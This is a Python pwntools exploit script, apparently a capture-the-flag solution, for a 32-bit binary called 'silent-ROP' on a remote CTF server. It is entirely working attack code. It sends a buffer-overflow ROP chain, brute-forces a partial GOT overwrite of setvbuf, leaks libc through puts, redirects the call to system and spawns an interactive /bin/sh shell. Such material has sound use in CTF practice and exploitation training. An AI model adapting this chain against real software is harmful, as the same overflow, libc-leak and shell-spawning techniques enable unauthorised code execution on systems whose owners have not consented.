from pwn import *

debug = 0

while(1):
	if(debug):
		r = process("./silent-ROP")
		#gdb.attach(r)
		system_off = 0x45830
		read_off = 0xf5c00
	else:
		r = remote("ctf.k3rn3l4rmy.com", 2202)
		system_off = 0x45830
		read_off =   0xf5c00
	
	
	puts_off = 0x71cd0
	setvbuf_got = 0x0804c014
	read = 0x8049070
	puts = 0x8049090
	pop3_ret = 0x080492c1
	pop_ret = 0x08049022
	bss = 0x0804c500
	
	
	payload = b'a'*0x1c  # padding
	payload += p32(read) + p32(pop3_ret)            # overwrite setvbuf -> puts
	payload += p32(0) + p32(setvbuf_got) + p32(2)   
	payload += p32(puts) + p32(pop_ret) + p32(setvbuf_got)   # leak dia chi lib
	payload += p32(read) + p32(pop3_ret)                #  overwrite setvbuf -> system
	payload += p32(0) + p32(setvbuf_got) + p32(4)       
	payload += p32(read) + p32(pop3_ret)                # create /bin/sh
	payload += p32(0) + p32(bss) + p32(20)
	payload += p32(puts) + p32(0x1337) + p32(bss)
	payload += b'\x00'*(0xd8 - len(payload) - 1)
	r.sendline(payload)
	
	
	payload = b"\xd0\x1c"
	r.send(payload)
	
	try:
		stuff = r.recvuntil(b'\xf7')
		print(stuff)
		libc_base = int.from_bytes(stuff, "little") - puts_off
		system_addr = libc_base + system_off
		print(hex(libc_base))
	
		payload = p32(system_addr)
		r.send(payload)
		r.sendline(b'/bin/sh\x00')
		r.interactive()
		break
	except:
		r.close()
	
	